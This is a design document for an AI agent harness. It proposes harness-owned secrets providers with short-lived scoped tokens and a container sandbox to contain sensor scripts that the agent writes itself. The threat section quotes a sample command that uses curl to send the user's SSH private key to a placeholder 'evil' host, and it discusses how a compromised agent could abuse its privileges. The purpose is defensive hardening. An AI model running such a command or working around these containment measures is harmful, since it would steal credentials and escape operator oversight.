# Secrets providers + execution sandboxing (design)

*A reflection prompted by Phase 6: the X integration put OAuth2 fetch/refresh/rotation
inside a **sensor script**. That's the wrong place — and it surfaced a deeper truth about
what actually runs on the box.*

## The realization: a sensor is arbitrary code, not gated cognition

The wall (`canUseTool`) and the firebreak (the Baton) govern what the **agent** does — every
tool call routes through the out-of-process responder, every untrusted byte is digested before
it reaches a tool-bearing context. **None of that touches a sensor.** A `stimuli/*/scripts/
fetch_feed.py` is `python3 fetch_feed.py` — arbitrary code running with the harness's
filesystem, network, and process privileges. And sensors are **Reflect-authored** (the duck
writes its own senses), so the duck can, in principle, author a sensor that does
`os.system("curl evil … $(cat ~/.ssh/id_rsa)")`. The wall is no defense here; it's the wrong
layer.

So the hardening splits into two **orthogonal** mitigations:

| Concern | Bound | Seam |
|---|---|---|
| What the code can **see** | short-lived, scoped, rotatable tokens — never root creds | **Secrets providers** |
| What the code can **do** | filesystem / network / process isolation | **Execution sandbox** |

They compose: a provider hands a sensor a ~2h bearer; the sandbox makes sure that even a
malicious sensor can only reach the one API host with it, can't read the soul, can't fork-bomb.

---

## 1. Secrets providers (next interim phase — seam laid in `src/secrets/providers.rs`)

**Problem.** `x_api.py` loads creds, refreshes the OAuth2 access token, persists the rotating
refresh token. That's a lot of secret *lifecycle* burden in something that should just perceive
— and it means the sensor holds the **client secret + refresh token** (the root credential),
which arbitrary sensor code could exfiltrate, and a leak is *not* cheaply rotatable.

**Design — a third secret tier.** Today (PRD §7.2): *recoverable → forwarded env*,
*continuity-ending → harness-only*. Add **provider-materialized**: the harness owns the root
creds + rotation; the consumer gets a **derived, short-lived, scoped** value.

**A provider is a trusted, harness-owned SCRIPT, seamed via YAML** — so a new secret never
touches the Rust harness (decided + built):

```yaml
# dack.config.yaml
secrets_providers:
  - name: x
    command: ["python3", "secrets-providers/x_oauth2.py"]   # trusted, harness-owned
    env: { X_CREDS_FILE: agentdack.rw.x.txt, X_TOKEN_STORE: …tokens.json }  # config, not secrets
    keys: [X_BEARER_TOKEN]
```
```
ScriptSecretsProvider.materialize() — run `command` with `env`, read JSON {KEY: value} stdout
SecretsBroker.env_for(scopes)       — run exactly the providers a duty declared, merge,
                                      fail closed on an unknown scope (least-privilege)
duty frontmatter: `secrets: [x]`    — what to inject;  Ingestor materializes + injects it
```

The provider script (`x_oauth2.py`) owns everything sensitive — client secret, rotating
refresh token, token store — and **rotates only when needed**: it stores `expires_at` and
refreshes only within a skew of expiry, *burning no API call to validate* (the token is reused
across many sensor runs).

**The win, concretely.** `x_api.py` dropped *all* OAuth2 machinery → it reads `X_BEARER_TOKEN`
and makes one `Authorization: Bearer` call. The sensor never sees `client_secret` /
`refresh_token`, never writes a store. A leaked bearer expires in ~2h and is rotatable; the
root credential stays in the harness. **Separation of concerns AND blast-radius reduction.**
Adding cove.trade = a YAML entry + a `cove.py` — the harness never changes.

**Two consumption points, one broker — and the trust split.** A cycle uses secrets twice:

| Point | Declared in | Authored by | Materialized for |
|---|---|---|---|
| **Sensor** (Perceive's input) | the **duty** `secrets:` (frontmatter) | Reflect (the duck) | the sensor subprocess |
| **Skills** (the **act**) | the **route** `secrets:` (config) | the **operator** | the Express/Settle invocation only |

Both are bounded by the operator's `secrets_providers` (the broker fails closed on any scope
with no provider), so the duck can only *select* from what the operator configured — never
invent a secret. The **act**-phase declaration lives on the **route** precisely because routing
is operator config: a compromised duck cannot route itself `[bankr]`. And act-secrets are
materialized for Express/Settle **only** — the read-only **Perceive holds no network capability
credential** (the reversibility cut, enforced; `harness::act_secrets` + the
`express_gets_route_secrets_but_perceive_does_not` test). The duck's eventual cove.trade flow
("ask Twitter which coin, analyze, buy ≤$1/day") needs no new harness plumbing — a `cove`
provider script + `secrets: [cove]` on the trade route.

**Live-verified:** provider run #1 refreshed + wrote `expires_at`; run #2 returned the same
**cached** token (no refresh); the sensor emitted the feed with **only `X_BEARER_TOKEN`** set
(creds file + store unset). Tests: `secrets::providers` (script run + parse, broker fail-closed).

---

## 2. Execution sandbox (seams landed in `src/sandbox/mod.rs`; container runs deferred)

**Design — a `Command` transformer.** A `Sandbox` rewrites the spawn command:

```
trait Sandbox { fn command(&self, spec: &ProcessSpec) -> Command }
  HostSandbox   — returns the command unchanged (today's behaviour, ZERO isolation)
  DockerSandbox — wraps it in `docker run …`, mapping IsolationPolicy → flags
```

Because a sandbox only rewrites the command, the **same seam serves a batch sensor**
(`wait_with_output`) **and the interactive stdio bridge** (`docker run -i` pipes stdio). The
three execution surfaces route through it:

| Surface | ExecKind | Soul mount | Default policy |
|---|---|---|---|
| Sensor (`SubprocessSensor`) | `Sensor` | none | strict — read-only rootfs, no caps, scratch `/tmp`, egress denied-until-allowlisted |
| Agent / bridge (`OpenClaudeClient`) | `Agent` | **rw volume** | soul writable; provider egress |
| Worker (Phase 10) | `Worker` | none | isolated `/workspace`, strictest |

`IsolationPolicy` exposes the axes the operator asked for — **filesystem** (`read_only_rootfs`,
`tmpfs`, mounts), **network** (`None`/`Loopback`/`Allowlist`/`Full`), **processes**
(`pids_limit`, `drop_all_caps`, `no_new_privileges`, `user`, `memory`). The `-e KEY`
pass-through keeps secret *values* off the visible command line (tested).

**Wired now (behaviour-preserving):** `SubprocessSensor` and `OpenClaudeClient` both build a
`ProcessSpec` and spawn via `sandbox.command()`, defaulting to `HostSandbox`. The agent's
`ProcessSpec` carries the **soul repo as a writable mount** (the "soul mounted as a volume"
goal) — inert under Host, real under Docker. `DockerSandbox` builds the full `docker run` argv
(tested) — so the flag mapping is concrete and reviewable.

**Deferred (the implementation, opt-in):** actually running containers (Docker + base images
with `python3` / `bun`+bridge deps), an **egress-allowlist proxy** (so `Allowlist` is more than
fail-closed), **config-driven policy** (a `isolation:` section selecting backend + per-kind
policy), and the worker integration (Phase 10). This is the **generalizable-DAC win**: a
company spawning customer-support agents flips on container isolation per axis — same harness,
adapter swap, soul as a mounted volume.

**Why this matters beyond the duck.** The sandbox seam + the keyless-worker model (arch §6.5)
together are what make "rent a sovereign agent, bounded below the model" safe to sell: the
operator chooses the isolation envelope (fs/net/proc), the agent's irreversible surface is
walled, and its *code* surfaces (sensors, workers, the engine) run in a box.
